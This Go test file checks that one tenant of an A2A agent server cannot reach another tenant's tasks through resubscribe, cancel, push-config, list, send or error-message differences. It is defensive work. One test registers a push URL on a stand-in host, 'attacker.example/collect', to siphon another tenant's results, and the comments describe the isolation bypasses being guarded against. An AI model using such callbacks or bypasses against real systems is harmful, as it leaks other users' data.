package server_test

import (
	"context"
	"fmt"
	"net"
	"net/http"
	"strings"
	"sync"
	"testing"
	"time"

	"crew-go/a2a/server"
	"crew-go/agent_v2"
	"crew-go/model"
	"crew-go/schema"

	a2atypes "github.com/a2aproject/a2a-go/v2/a2a"
	"github.com/a2aproject/a2a-go/v2/a2aclient"
	"github.com/a2aproject/a2a-go/v2/a2asrv"
	"github.com/a2aproject/a2a-go/v2/a2asrv/taskstore"
)

// 跨租户入口回归套：**逐个协议方法**验证「只知道别人的 taskId」够不着别人的东西。
//
// 起因是 tasks/resubscribe 的实测泄漏——租户 B 只凭 A 的 taskId 就订到了 A 的实时
// artifact 流和完整最终答复。根因：那条路走执行管理器的在途表（按 taskID 单键），
// **碰都不碰 task store**，所以 store 那层的归属检查覆盖不到它（快照挡住了、直播没挡）。
//
// 修法是把归属检查提到 CallInterceptor.Before——**所有协议方法唯一都经过的点**。
// 这套用例的价值在于**逐个入口**都钉一遍：带 taskID 的方法有七八个，下游各不相同
// （taskStore / 在途表 / push-config store），逐个补必然漏，而漏了不报错。
//
// ⚠️ 新增协议方法时，这里和 `requestTaskID` 都要跟着加。

// ---- 阻塞 model：让一次执行长时间停在「在途」 ----

type probeBlockModel struct {
	tools   []*schema.ToolInfo
	secret  string
	started chan struct{}
	gate    chan struct{}
	once    sync.Once
}

func (m *probeBlockModel) WithTools(tools []*schema.ToolInfo) (model.ChatModel, error) {
	m.tools = tools
	return m, nil
}

func (m *probeBlockModel) Generate(_ context.Context, _ []*schema.Message, _ ...model.Option) (*schema.Message, error) {
	m.once.Do(func() { close(m.started) })
	<-m.gate
	return schema.AssistantMessage(m.secret), nil
}

func (m *probeBlockModel) Stream(_ context.Context, _ []*schema.Message, _ ...model.Option) (*schema.StreamReader[*schema.Message], error) {
	sr, send := schema.NewStreamReader[*schema.Message](4)
	go func() {
		send(schema.AssistantMessage("early-")) // 早于 B 订阅
		m.once.Do(func() { close(m.started) })
		<-m.gate
		send(schema.AssistantMessage(m.secret)) // **B 订阅之后**才发的机密
		schema.CloseSend(sr)
	}()
	return sr, nil
}

// probeServer 起一个带租户 header 的 server，返回 base + client 工厂。
func probeServer(t *testing.T, ag agent_v2.Agent) (string, func(string) *a2aclient.Client) {
	return probeServerWithOpts(t, ag)
}

func probeServerWithOpts(t *testing.T, ag agent_v2.Agent, extra ...server.ExecutorOption) (string, func(string) *a2aclient.Client) {
	t.Helper()
	ln, err := net.Listen("tcp", "127.0.0.1:0")
	if err != nil {
		t.Fatalf("listen: %v", err)
	}
	base := "http://" + ln.Addr().String()
	opts := append([]server.ExecutorOption{
		server.WithOwnerResolver(func(ctx context.Context) string {
			o, _ := ctx.Value(probeWhoKey{}).(string)
			return o
		}),
	}, extra...)
	h := server.Handler(ag, base, opts...)
	wrapped := http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		who := r.Header.Get("X-Tenant")
		h.ServeHTTP(w, r.WithContext(context.WithValue(r.Context(), probeWhoKey{}, who)))
	})
	go func() { _ = http.Serve(ln, wrapped) }()
	t.Cleanup(func() { _ = ln.Close() })
	for i := 0; i < 100; i++ {
		if resp, err := http.Get(base + "/.well-known/agent-card.json"); err == nil {
			resp.Body.Close()
			break
		}
		time.Sleep(10 * time.Millisecond)
	}
	return base, func(tenant string) *a2aclient.Client {
		c, err := a2aclient.NewFromCard(context.Background(), server.Card(ag, base),
			a2aclient.WithJSONRPCTransport(&http.Client{Transport: &tenantRT{tenant: tenant}}))
		if err != nil {
			t.Fatalf("client(%s): %v", tenant, err)
		}
		return c
	}
}

// ---- 探针 1：tasks/resubscribe（SubscribeToTask）----
//
// SDK 的 SubscribeToTask → execManager.Resubscribe(ctx, req.ID)，**整条不碰 taskStore**，
// 只查 localManager.executions[taskID] 这张按 taskID 单键的内存表。我们的归属检查在
// (a) 挂起表（Executor）和 (b) taskStore 包装层——两处都在这条路之外。
func TestCrossTenant_Resubscribe_CrossTenant(t *testing.T) {
	m := &probeBlockModel{secret: "SECRET-OF-A", started: make(chan struct{}), gate: make(chan struct{})}
	ag := agent_v2.NewBasicAgent(agent_v2.WithName("blocker"), agent_v2.WithModel(m))
	_, mk := probeServer(t, ag)

	ca, cb := mk("tenant-A"), mk("tenant-B")
	ctx := context.Background()

	// A 发起一次长跑执行
	taskCh := make(chan a2atypes.TaskID, 1)
	aDone := make(chan struct{})
	go func() {
		defer close(aDone)
		msg := a2atypes.NewMessage(a2atypes.MessageRoleUser, a2atypes.NewTextPart("A 的机密请求"))
		sent := false
		for ev, e := range ca.SendStreamingMessage(ctx, &a2atypes.SendMessageRequest{Message: msg}) {
			if e != nil {
				t.Logf("A stream err: %v", e)
				return
			}
			var id a2atypes.TaskID
			switch v := ev.(type) {
			case *a2atypes.Task:
				id = v.ID
			case *a2atypes.TaskStatusUpdateEvent:
				id = v.TaskID
			case *a2atypes.TaskArtifactUpdateEvent:
				id = v.TaskID
			}
			if id != "" && !sent {
				sent = true
				taskCh <- id
			}
		}
	}()

	var taskID a2atypes.TaskID
	select {
	case taskID = <-taskCh:
	case <-time.After(10 * time.Second):
		t.Fatal("没拿到 A 的 taskID")
	}
	<-m.started // A 已进入 model，执行在途
	t.Logf("A 的 taskID = %s（执行在途）", taskID)

	// B 拿着 A 的 taskId 调 tasks/resubscribe（在自己的 goroutine 里收，收满就停）
	subCtx, subCancel := context.WithTimeout(ctx, 8*time.Second)
	defer subCancel()
	bCh := make(chan []string, 1)
	go func() {
		var bSaw []string
		for ev, e := range cb.SubscribeToTask(subCtx, &a2atypes.SubscribeToTaskRequest{ID: taskID}) {
			if e != nil {
				bSaw = append(bSaw, "ERR:"+e.Error())
				break
			}
			switch v := ev.(type) {
			case *a2atypes.Task:
				bSaw = append(bSaw, "TASK:"+string(v.Status.State))
				for _, h := range v.History {
					txt, _ := partsText(h.Parts)
					bSaw = append(bSaw, "HIST:"+txt)
				}
			case *a2atypes.TaskStatusUpdateEvent:
				bSaw = append(bSaw, "STATUS:"+string(v.Status.State))
				if v.Status.Message != nil {
					txt, _ := partsText(v.Status.Message.Parts)
					bSaw = append(bSaw, "STATUSMSG:"+txt)
				}
			case *a2atypes.TaskArtifactUpdateEvent:
				if v.Artifact != nil {
					txt, _ := partsText(v.Artifact.Parts)
					bSaw = append(bSaw, "ARTIFACT:"+txt)
				}
			}
		}
		bCh <- bSaw
	}()

	time.Sleep(1500 * time.Millisecond) // 让 B 的订阅先挂上
	close(m.gate)                       // A 现在才吐出机密
	<-aDone

	var bSaw []string
	select {
	case bSaw = <-bCh:
	case <-time.After(10 * time.Second):
		t.Fatal("B 的订阅没收摊")
	}

	all := strings.Join(bSaw, " | ")
	t.Logf("[resubscribe] B 看到: %s", all)
	if strings.Contains(all, "SECRET-OF-A") || strings.Contains(all, "A 的机密请求") {
		t.Errorf("!!! 泄漏：B 经 tasks/resubscribe 收到了 A 的实时输出：%s", all)
	}
}

// ---- 探针 2：tasks/cancel（B 取消 A 的在途任务 = 跨租户 DoS）----
func TestCrossTenant_Cancel_CrossTenant_Live(t *testing.T) {
	m := &probeBlockModel{secret: "SECRET-OF-A", started: make(chan struct{}), gate: make(chan struct{})}
	ag := agent_v2.NewBasicAgent(agent_v2.WithName("blocker"), agent_v2.WithModel(m))
	_, mk := probeServer(t, ag)

	ca, cb := mk("tenant-A"), mk("tenant-B")
	ctx := context.Background()

	taskCh := make(chan a2atypes.TaskID, 1)
	aStates := make(chan []string, 1)
	go func() {
		var states []string
		msg := a2atypes.NewMessage(a2atypes.MessageRoleUser, a2atypes.NewTextPart("A 的机密请求"))
		sent := false
		for ev, e := range ca.SendStreamingMessage(ctx, &a2atypes.SendMessageRequest{Message: msg}) {
			if e != nil {
				states = append(states, "ERR:"+e.Error())
				break
			}
			var id a2atypes.TaskID
			switch v := ev.(type) {
			case *a2atypes.Task:
				id = v.ID
				states = append(states, "TASK:"+string(v.Status.State))
			case *a2atypes.TaskStatusUpdateEvent:
				id = v.TaskID
				states = append(states, "STATUS:"+string(v.Status.State))
			case *a2atypes.TaskArtifactUpdateEvent:
				id = v.TaskID
			}
			if id != "" && !sent {
				sent = true
				taskCh <- id
			}
		}
		aStates <- states
	}()

	var taskID a2atypes.TaskID
	select {
	case taskID = <-taskCh:
	case <-time.After(10 * time.Second):
		t.Fatal("没拿到 A 的 taskID")
	}
	<-m.started
	t.Logf("A 的 taskID = %s（执行在途）", taskID)

	// B 取消 A 的在途 task
	cctx, ccancel := context.WithTimeout(ctx, 5*time.Second)
	defer ccancel()
	got, err := cb.CancelTask(cctx, &a2atypes.CancelTaskRequest{ID: taskID})
	if err != nil {
		t.Logf("[cancel] B 被拒: %v", err)
	} else {
		t.Errorf("!!! B 的取消被接受了：state=%s", got.Status.State)
	}

	close(m.gate)
	select {
	case st := <-aStates:
		joined := strings.Join(st, " | ")
		t.Logf("[cancel] A 侧看到的状态序列: %s", joined)
		if strings.Contains(strings.ToUpper(joined), "CANCELED") {
			t.Errorf("!!! 跨租户 DoS：B 取消掉了 A 的在途任务（A 侧状态: %s）", joined)
		}
	case <-time.After(10 * time.Second):
		t.Error("A 侧没收摊")
	}
}

// ---- 探针 3：push notification config 四个方法 ----
//
// 「给别人的 task 设推送地址」= 把别人的结果发到我的服务器。
func TestCrossTenant_PushConfig_CrossTenant(t *testing.T) {
	ag := newAsker(t, "你的密码是什么")
	_, mk := probeServer(t, ag)
	ca, cb := mk("tenant-A"), mk("tenant-B")
	ctx := context.Background()

	var taskID a2atypes.TaskID
	msg := a2atypes.NewMessage(a2atypes.MessageRoleUser, a2atypes.NewTextPart("A 的机密请求"))
	for ev, e := range ca.SendStreamingMessage(ctx, &a2atypes.SendMessageRequest{Message: msg}) {
		if e != nil {
			t.Fatalf("A send: %v", e)
		}
		switch v := ev.(type) {
		case *a2atypes.Task:
			taskID = v.ID
		case *a2atypes.TaskStatusUpdateEvent:
			taskID = v.TaskID
		}
	}
	if taskID == "" {
		t.Fatal("没拿到 taskID")
	}
	t.Logf("A 的 taskID = %s", taskID)

	// B 给 A 的 task 设推送地址
	cfg, err := cb.CreateTaskPushConfig(ctx, &a2atypes.PushConfig{
		TaskID: taskID, ID: "evil", URL: "http://attacker.example/collect",
	})
	if err != nil {
		t.Logf("[push/create] B 被拒: %v", err)
	} else {
		t.Errorf("!!! B 给 A 的 task 设成了推送地址: %+v", cfg)
	}

	if got, err := cb.GetTaskPushConfig(ctx, &a2atypes.GetTaskPushConfigRequest{TaskID: taskID, ID: "evil"}); err != nil {
		t.Logf("[push/get] B 被拒: %v", err)
	} else {
		t.Errorf("!!! B 读到了 A 的 task 推送配置: %+v", got)
	}

	if got, err := cb.ListTaskPushConfigs(ctx, &a2atypes.ListTaskPushConfigRequest{TaskID: taskID}); err != nil {
		t.Logf("[push/list] B 被拒: %v", err)
	} else {
		t.Errorf("!!! B 列出了 A 的 task 推送配置: %+v", got)
	}

	if err := cb.DeleteTaskPushConfig(ctx, &a2atypes.DeleteTaskPushConfigRequest{TaskID: taskID, ID: "evil"}); err != nil {
		t.Logf("[push/delete] B 被拒: %v", err)
	} else {
		t.Errorf("!!! B 删掉了 A 的 task 推送配置")
	}
}

// ---- 探针 4：tasks/list（含客户端可控的 Tenant 字段）----
func TestCrossTenant_ListTasks_CrossTenant(t *testing.T) {
	ag := newAsker(t, "你的密码是什么")
	_, mk := probeServer(t, ag)
	ca, cb := mk("tenant-A"), mk("tenant-B")
	ctx := context.Background()

	msg := a2atypes.NewMessage(a2atypes.MessageRoleUser, a2atypes.NewTextPart("A 的机密请求"))
	for ev, e := range ca.SendStreamingMessage(ctx, &a2atypes.SendMessageRequest{Message: msg}) {
		if e != nil {
			t.Fatalf("A send: %v", e)
		}
		_ = ev
	}

	// B 直接列
	check := func(label string, req *a2atypes.ListTasksRequest) {
		resp, err := cb.ListTasks(ctx, req)
		if err != nil {
			t.Logf("[list %s] B 被拒: %v", label, err)
			return
		}
		var seen []string
		for _, tk := range resp.Tasks {
			for _, h := range tk.History {
				txt, _ := partsText(h.Parts)
				seen = append(seen, txt)
			}
		}
		all := strings.Join(seen, " | ")
		t.Logf("[list %s] B 拿到 %d 个 task, 内容=%q", label, len(resp.Tasks), all)
		if strings.Contains(all, "A 的机密请求") || strings.Contains(all, "你的密码是什么") {
			t.Errorf("!!! 泄漏：B 经 tasks/list(%s) 读到 A 的内容", label)
		}
	}
	check("plain", &a2atypes.ListTasksRequest{})
	// Tenant 是请求体里客户端可控的字段——试试能不能拿它冒充 A
	check("tenant=A", &a2atypes.ListTasksRequest{Tenant: "tenant-A"})
}

// ---- 探针 5：message/send 带别人 taskId 且**目标不在挂起表**（新建同 ID）----
//
// 挂起表的键是 (owner,taskID)，B 查不到 ⟹ 走「新 task」分支。那条分支会拿
// execCtx.TaskID 建新执行——会不会覆盖/污染 A 的 task？
func TestCrossTenant_SendWithForeignTaskID_NotPending(t *testing.T) {
	ag := newAsker(t, "你的密码是什么")
	_, mk := probeServer(t, ag)
	ca, cb := mk("tenant-A"), mk("tenant-B")
	ctx := context.Background()

	var taskID a2atypes.TaskID
	msg := a2atypes.NewMessage(a2atypes.MessageRoleUser, a2atypes.NewTextPart("A 的机密请求"))
	for ev, e := range ca.SendStreamingMessage(ctx, &a2atypes.SendMessageRequest{Message: msg}) {
		if e != nil {
			t.Fatalf("A send: %v", e)
		}
		switch v := ev.(type) {
		case *a2atypes.Task:
			taskID = v.ID
		case *a2atypes.TaskStatusUpdateEvent:
			taskID = v.TaskID
		}
	}
	t.Logf("A 的 taskID = %s", taskID)

	// A 先确认自己还能读到自己的 task
	before, err := ca.GetTask(ctx, &a2atypes.GetTaskRequest{ID: taskID})
	if err != nil {
		t.Fatalf("A 读自己的 task: %v", err)
	}
	t.Logf("B 动手前：A 的 task state=%s history=%d 条", before.Status.State, len(before.History))

	bmsg := a2atypes.NewMessageForTask(a2atypes.MessageRoleUser,
		a2atypes.TaskInfo{TaskID: taskID}, a2atypes.NewTextPart("B 试图接手"))
	for ev, e := range cb.SendStreamingMessage(ctx, &a2atypes.SendMessageRequest{Message: bmsg}) {
		if e != nil {
			t.Logf("[send-foreign] B err: %v", e)
			break
		}
		_ = ev
	}

	after, err := ca.GetTask(ctx, &a2atypes.GetTaskRequest{ID: taskID})
	if err != nil {
		t.Errorf("!!! B 动手后 A 读不到自己的 task 了: %v", err)
		return
	}
	t.Logf("B 动手后：A 的 task state=%s history=%d 条", after.Status.State, len(after.History))
	if after.Status.State != before.Status.State {
		t.Errorf("!!! B 改变了 A 的 task 状态: %s → %s", before.Status.State, after.Status.State)
	}
	var hist []string
	for _, h := range after.History {
		txt, _ := partsText(h.Parts)
		hist = append(hist, txt)
	}
	if strings.Contains(strings.Join(hist, "|"), "B 试图接手") {
		t.Errorf("!!! B 的消息被写进了 A 的 task 历史: %v", hist)
	}
}

// TestProbe_Resubscribe_AfterInterrupt 界定泄漏窗口：task 停在 input-required 之后
// （执行已从 localManager.executions 注销）B 还能不能订阅。
func TestCrossTenant_Resubscribe_AfterInterrupt(t *testing.T) {
	ag := newAsker(t, "你的密码是什么")
	_, mk := probeServer(t, ag)
	ca, cb := mk("tenant-A"), mk("tenant-B")
	ctx := context.Background()

	var taskID a2atypes.TaskID
	msg := a2atypes.NewMessage(a2atypes.MessageRoleUser, a2atypes.NewTextPart("A 的机密请求"))
	for ev, e := range ca.SendStreamingMessage(ctx, &a2atypes.SendMessageRequest{Message: msg}) {
		if e != nil {
			t.Fatalf("A send: %v", e)
		}
		switch v := ev.(type) {
		case *a2atypes.Task:
			taskID = v.ID
		case *a2atypes.TaskStatusUpdateEvent:
			taskID = v.TaskID
		}
	}
	t.Logf("A 的 taskID = %s（已停在 input-required，执行已注销）", taskID)

	subCtx, cancel := context.WithTimeout(ctx, 3*time.Second)
	defer cancel()
	var saw []string
	for ev, e := range cb.SubscribeToTask(subCtx, &a2atypes.SubscribeToTaskRequest{ID: taskID}) {
		if e != nil {
			saw = append(saw, "ERR:"+e.Error())
			break
		}
		saw = append(saw, fmt.Sprintf("EV:%T", ev))
	}
	t.Logf("[resubscribe/已中断] B 看到: %s", strings.Join(saw, " | "))

	// 对照：A 自己订阅自己的（同样已注销）——确认这不是 owner 的作用而是「没有在途执行」
	subCtx2, cancel2 := context.WithTimeout(ctx, 3*time.Second)
	defer cancel2()
	var sawA []string
	for ev, e := range ca.SubscribeToTask(subCtx2, &a2atypes.SubscribeToTaskRequest{ID: taskID}) {
		if e != nil {
			sawA = append(sawA, "ERR:"+e.Error())
			break
		}
		sawA = append(sawA, fmt.Sprintf("EV:%T", ev))
	}
	t.Logf("[resubscribe/已中断] A 自己看到: %s", strings.Join(sawA, " | "))
}

// TestCrossTenant_CustomTaskStoreStillGuarded 钉住：业务经 [server.WithTaskStore] 换
// 后端时，归属检查**不会跟着消失**。
//
// 守卫原本只长在 `Handler()` 的默认装配里——业务想换持久 task store 只能自己拼
// a2asrv 栈，那时 store 包装层和 CallInterceptor 里的检查会一起没掉，跨租户读原样
// 成立。修法是让业务只声明「用哪个后端」，包装由框架做。
//
// 守卫要是靠调用方记得自己包，那它就不是守卫。
func TestCrossTenant_CustomTaskStoreStillGuarded(t *testing.T) {
	// 业务自带的后端（这里就用 SDK 的默认实现当替身——重点是它经 WithTaskStore 进来）
	custom := taskstore.NewInMemory(&taskstore.InMemoryStoreConfig{
		Authenticator: a2asrv.NewTaskStoreAuthenticator(),
	})
	m := &probeBlockModel{secret: "SECRET-CUSTOM", started: make(chan struct{}), gate: make(chan struct{})}
	ag := agent_v2.NewBasicAgent(agent_v2.WithName("blocker"), agent_v2.WithModel(m))
	_, mk := probeServerWithOpts(t, ag, server.WithTaskStore(custom))
	ca, cb := mk("tenant-A"), mk("tenant-B")

	ctx := context.Background()
	// taskID 是 A 那条流的 goroutine 写、本 goroutine 轮询读——**必须加锁**，裸变量在
	// -race 下 100% 报（这条是 fixture 自己的并发 bug，跟被测的东西无关）。
	var (
		mu  sync.Mutex
		tid a2atypes.TaskID
	)
	getTID := func() a2atypes.TaskID {
		mu.Lock()
		defer mu.Unlock()
		return tid
	}
	go func() {
		msg := a2atypes.NewMessage(a2atypes.MessageRoleUser, a2atypes.NewTextPart("A 的请求"))
		for ev, e := range ca.SendStreamingMessage(ctx, &a2atypes.SendMessageRequest{Message: msg}) {
			if e != nil {
				return
			}
			if v, ok := ev.(*a2atypes.Task); ok {
				mu.Lock()
				if tid == "" {
					tid = v.ID
				}
				mu.Unlock()
			}
		}
	}()
	<-m.started
	for i := 0; i < 200 && getTID() == ""; i++ {
		time.Sleep(10 * time.Millisecond)
	}
	taskID := getTID()
	if taskID == "" {
		close(m.gate)
		t.Fatal("没拿到 taskID")
	}

	got, err := cb.GetTask(ctx, &a2atypes.GetTaskRequest{ID: taskID})
	if err == nil {
		t.Fatalf("换了自定义后端后归属检查失效：B 读到了 A 的 task %+v", got)
	}
	// 正向：A 自己读得到（否则「整个坏掉」也能让上面那条绿）。
	if _, err := ca.GetTask(ctx, &a2atypes.GetTaskRequest{ID: taskID}); err != nil {
		t.Errorf("A 读自己的 task 失败了：%v", err)
	}
	close(m.gate)
}

// TestCrossTenant_NoExistenceOracle 钉住：**「存在但不是你的」和「根本不存在」在 wire
// 上不可区分**。
//
// 可区分就是一个 1 bit 的存在性预言机——攻击者拿它枚举 taskId 是否存在。`taskstore_owner.go`
// 的 godoc 明写了这条承诺（「跟『不存在』同一个错」），而承诺没有用例守着，下一次
// 「改进错误信息」就会把它拆了：给拒绝路径加一句更友好的说明，看着是改善，实际是泄漏。
//
// ⚠️ 曾经真的分叉过：归属检查还在 interceptor 里短路时，拒绝返 `"task not found"`、
// 而真不存在的走 handler 返 `"failed to get task: task not found"`。归属戳进 Task.Metadata
// 之后两条路合并到 store 层同一个出口，才逐字相同。
func TestCrossTenant_NoExistenceOracle(t *testing.T) {
	m := &probeBlockModel{secret: "S", started: make(chan struct{}), gate: make(chan struct{})}
	close(m.gate) // 不阻塞，让它跑完
	ag := agent_v2.NewBasicAgent(agent_v2.WithName("x"), agent_v2.WithModel(m))
	_, mk := probeServer(t, ag)
	ca, cb := mk("tenant-A"), mk("tenant-B")
	ctx := context.Background()

	var tid a2atypes.TaskID
	msg := a2atypes.NewMessage(a2atypes.MessageRoleUser, a2atypes.NewTextPart("A 的请求"))
	for ev, e := range ca.SendStreamingMessage(ctx, &a2atypes.SendMessageRequest{Message: msg}) {
		if e != nil {
			break
		}
		if v, ok := ev.(*a2atypes.Task); ok && tid == "" {
			tid = v.ID
		}
	}
	if tid == "" {
		t.Fatal("前提不成立：没拿到 A 的 taskID")
	}

	_, errExists := cb.GetTask(ctx, &a2atypes.GetTaskRequest{ID: tid})
	_, errAbsent := cb.GetTask(ctx, &a2atypes.GetTaskRequest{ID: "task-that-never-existed"})
	if errExists == nil {
		t.Fatal("前提不成立：B 居然读到了 A 的 task")
	}
	if errAbsent == nil {
		t.Fatal("前提不成立：读一个不存在的 taskId 居然成功了")
	}
	if errExists.Error() != errAbsent.Error() {
		t.Errorf("存在性预言机：两条路径的错误可区分\n  存在但非己: %v\n  根本不存在: %v",
			errExists, errAbsent)
	}
}
